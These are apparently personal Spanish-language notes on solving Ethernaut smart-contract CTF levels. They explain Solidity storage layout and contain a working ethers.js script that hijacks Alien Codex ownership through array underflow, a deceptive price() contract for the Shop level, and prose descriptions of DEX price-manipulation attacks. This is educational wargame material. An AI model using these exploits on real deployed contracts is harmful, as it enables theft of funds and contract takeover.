# Comentarios y aprendizajes de resolver el ethernaut

## Alien Code X

Clave entender como funcionan los arrays dinámicos en solidity, es decir, los que se definen por ejemplo `bytes32[]`. En el slot de memoria correspondiente solo se va a guardar el tamaño del array en cuestión, pero la data se va a alojar en el `keccak(slot_id)`.

Imagino que luego solidity lo que hace es: si tengo que leer de la posición 15, voy a buscar el elemento en la dirección `keccak(slot_id) + 15`.

Para resolverlo hay que, de alguna manera, forzar a escribir en el slot 0 donde está el owner del contrato.

- slot_0
- .
- .
- slot_array = keccak(1) = 0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6 = 90743482286830539503240959006302832933333810038750515972785732718729991261126

Es decir, cuando quiero escribir en el index 0 del array, en verdad estoy queriendo escribir en en slot 90743482286830539503240959006302832933333810038750515972785732718729991261126. Si escribo en MAX_SLOT_ID - 90743482286830539503240959006302832933333810038750515972785732718729991261126 escribiré en el slot 0, porque me voy a pasar por overflow.

```
    const [firstOwner, usurper] = await ethers.getSigners();

    const factory = await ethers.getContractFactory("Alien");
    const alien = await factory.deploy();
    const contractAddy = await alien.getAddress();

    await alien.makeContact();
    // Con este valor en el slot de storage 1, podre reemplazar el owner por el que yo quiero.
    const desiredStorageValueWithNewOwner = `0x000000000000000000000001${usurper.address.substring(
      2
    )}`;
    // Al hacer retract, por el underflow de uint, el contrato asume que el array codex tiene la capacidad llena.
    // Con eso, me dejara escribir con el metodo `revise` en cualquier dirección
    await alien.retract();

    // por como funciona el dynamic array storage, este hash es la dirección de memoria donde estan los datos del array de manera consecutiva.
    const secondSlotHash = ethers.keccak256(
      "0x0000000000000000000000000000000000000000000000000000000000000001"
    );
    const startArrayStorageDirection = ethers.toBigInt(secondSlotHash);
    const valorEnStorage = await ethers.provider.getStorage(
      contractAddy,
      startArrayStorageDirection
    );
    // Por definicion de solidity, todo contrato tiene 2^256 slots de memoria
    const MAX_CONTRACT_SLOT_ID = ethers.toBigInt(2) ** ethers.toBigInt(256);
    // MAX_CONTRACT_SLOT_ID - startArrayStorageDirection es la distancia que hay desde
    // el slot de memoria donde arrancan los valores del array, hasta que me paso por overflow
    // al primer slot de memoria (donde justo esta el valor del addres!!)
    await alien.revise(
      MAX_CONTRACT_SLOT_ID - startArrayStorageDirection,
      desiredStorageValueWithNewOwner
    );
    expect(await alien.owner()).to.equal(usurper.address);
```

## Denial

El contrato tiene un owner definido. Recibe fondos en ese contrato, y cualquiera pueda ejecutar la funciona withdraw que lo que hace es enviar un 1% de los fondos al owner, y otro 1% al que ejecuta la transacción.

Acá la papa está en que no se chequea el resultado del call al partner (adrede) para que eso no bloquee que le lleguen los fondos al owner.

```
function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }
```

Entonces si el partner es un contrato, y adentro hace cualquier fruta, eso queda en un loop donde nunca el owner puede extraer los fondos. Queda bloqueado. Para sortear eso, donde queremos que "no nos importe revertir" la mejor práctica sería ponerle un gaslimit al call a un contrato externo. Esto haría que revierta el call, pero como no nos importa el resultado, el owner seguiría recibiendo sus fondos.

### Buyer

Acá se define una interfaz que debe ser implementada por el msg.sender. El tema es que quien la implementa puede definir el comportamiento que sea, entonces muy probablemente con implementar la interfaz y hacer que el método view "price" devuelva un precio mayor al del contrato `Shop` sea suficiente.

Ok no, en específico dice que el precio debe ser menor.

Lo clave está en que al ser una función view (y no pure) la misma puede acceder al estado de otros contratos, entonces, se puede hacer algo de este estilo:

```
function price() external view returns (uint) {
        if (shop.isSold()) {
            return 50;
        }
        return 150;
    }
```

## Dex

Acá basicamente hay que engañar al DEX para llevarme toda la liquidez de alguno de los dos tokens. Se me ocurren algunas ideas:

- Por lo que voy probando, al no tener manejo de decimales el dex, se puede empezar a descontrolar el precio cuando me queden precios con coma. Por ejemplo, cuando me quede un precio de 2,4 el contrato siempre redondea a 2.
- Jugando un poco con los swaps, pude conseguir sacar toda la liquidez de uno de los tokens.

# DexTwo

- Acá al no haber un require de que el `from` o el `to` sean los tokens que tienen liquidez en el dex, puedo crear un erc20 falopa, transferirle liquidez al dex y swapear para que el precio se calcule a partir del erc20 falopa.
